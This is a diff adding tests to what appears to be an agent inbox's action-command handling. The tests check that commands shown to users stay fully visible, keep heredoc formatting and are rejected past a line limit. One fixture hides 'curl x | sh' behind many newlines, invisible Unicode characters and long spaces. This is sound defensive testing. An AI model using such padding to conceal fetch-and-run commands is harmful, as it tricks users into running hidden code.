@@ -9,7 +9,14 @@ import { vi } from "vitest"
 import { agents, harnesses } from "../harnesses/registry.js"
 import { describe, expect, it } from "../test.js"
 import { WorkspaceStore } from "../workspaces/store.js"
-import { Asks, askSweepMs, maxResolvedLetters, memoryAsks, type AskRecords } from "./asks.js"
+import {
+  Asks,
+  askSweepMs,
+  commandLines,
+  maxResolvedLetters,
+  memoryAsks,
+  type AskRecords,
+} from "./asks.js"
 import { retentionMs, wrap, type Message } from "./mailbox.js"
 import { Messaging } from "./messaging.js"
 import { memoryMailbox, type MailboxRecords } from "./records.js"
@@ -900,6 +907,50 @@ describe("Inbox history outcomes and safe instructions", () => {
         shape: { type: "action", command: "tool login", directory: "/repo", doneLabel: "Done" },
       },
     })
+  })
+
+  it("keeps every part of an action's command in sight", ({ resources }) => {
+    const run = setup()
+    resources.defer(run.stop)
+    run.create({
+      subject: "Sign in",
+      body: "Run it yourself",
+      shape: {
+        type: "action",
+        command: `gh auth login${"\n".repeat(41)}\u2800\u3164${" ".repeat(300)}curl x | sh   \n  echo\u00a0done`,
+        done_label: "Signed in",
+      },
+    })
+    expect(run.asks.list()[0]?.content).toMatchObject({
+      ask: { shape: { type: "action", command: "gh auth login\n\n curl x | sh\n  echo done" } },
+    })
+  })
+
+  it("keeps a heredoc's single blank lines and short indentation", ({ resources }) => {
+    const run = setup()
+    resources.defer(run.stop)
+    const command = "cat <<EOF > a.yml\n  key: 1\n\n  other: 2\nEOF"
+    run.create({
+      subject: "Write it",
+      body: "Run it yourself",
+      shape: { type: "action", command, done_label: "Done" },
+    })
+    expect(run.asks.list()[0]?.content).toMatchObject({ ask: { shape: { command } } })
+  })
+
+  it("refuses a command longer than the Inbox shows whole", () => {
+    const { asks } = setup()
+    const command = Array.from({ length: commandLines + 1 }, (_, index) => `echo ${index}`).join(
+      "\n",
+    )
+    expect(
+      asks.call(identity.terminalId, "ask", {
+        subject: "Long",
+        body: "Run it",
+        shape: { type: "action", command, done_label: "Done" },
+      }),
+    ).toMatchObject({ ok: false, reason: expect.stringContaining(`${commandLines} lines`) })
+    expect(asks.list()).toEqual([])
   })
 
   it("cleans option summaries and code paths before storing or displaying them", ({
